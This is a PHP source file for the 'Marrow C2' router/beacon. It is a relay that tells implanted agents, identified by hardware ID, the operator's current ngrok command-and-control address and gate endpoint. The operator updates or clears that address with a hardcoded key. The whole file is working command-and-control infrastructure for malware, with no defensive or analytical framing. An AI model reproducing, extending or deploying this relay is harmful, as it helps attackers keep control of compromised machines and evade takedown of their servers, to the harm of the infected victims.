<?php
/**
 * Marrow C2 - Router/Beacon
 * InfinityFree 24/7 Relay
 * 
 * Agent calls: ?action=beacon&hwid=xxx → Returns ngrok URL
 * Operator calls: ?action=set&url=xxx&key=xxx → Updates ngrok URL
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// Secret key to update URL (change this!)
define('ADMIN_KEY', 'marrow2026secret');

// URL storage file (simpler than database for InfinityFree)
$url_file = __DIR__ . '/../data/ngrok_url.txt';

// Ensure data directory exists
$data_dir = dirname($url_file);
if (!is_dir($data_dir)) {
    @mkdir($data_dir, 0755, true);
}

$action = $_REQUEST['action'] ?? '';

switch ($action) {
    case 'beacon':
        // Agent beacon - return current ngrok URL
        $hwid = $_REQUEST['hwid'] ?? '';

        if (empty($hwid)) {
            echo json_encode(['error' => 'Missing hwid']);
            exit;
        }

        // Read current ngrok URL
        $url = file_exists($url_file) ? trim(file_get_contents($url_file)) : '';

        if (empty($url)) {
            echo json_encode(['status' => 'offline', 'message' => 'C2 not online']);
        } else {
            echo json_encode([
                'status' => 'online',
                'url' => $url,
                'gate' => $url . '/api/gate.php'
            ]);
        }
        break;

    case 'set':
        // Operator sets new ngrok URL
        $key = $_REQUEST['key'] ?? '';
        $url = $_REQUEST['url'] ?? '';

        if ($key !== ADMIN_KEY) {
            echo json_encode(['error' => 'Invalid key']);
            exit;
        }

        if (empty($url)) {
            echo json_encode(['error' => 'Missing url']);
            exit;
        }

        // Clean URL (remove trailing slash)
        $url = rtrim($url, '/');

        // Save URL
        if (file_put_contents($url_file, $url)) {
            echo json_encode(['status' => 'ok', 'url' => $url]);
        } else {
            echo json_encode(['error' => 'Failed to save URL']);
        }
        break;

    case 'get':
        // Get current URL (for debugging)
        $url = file_exists($url_file) ? trim(file_get_contents($url_file)) : '';
        echo json_encode(['url' => $url ?: 'not set']);
        break;

    case 'clear':
        // Clear URL (operator going offline)
        $key = $_REQUEST['key'] ?? '';

        if ($key !== ADMIN_KEY) {
            echo json_encode(['error' => 'Invalid key']);
            exit;
        }

        @unlink($url_file);
        echo json_encode(['status' => 'ok', 'message' => 'URL cleared']);
        break;

    default:
        echo json_encode(['error' => 'Invalid action', 'actions' => ['beacon', 'set', 'get', 'clear']]);
}
?>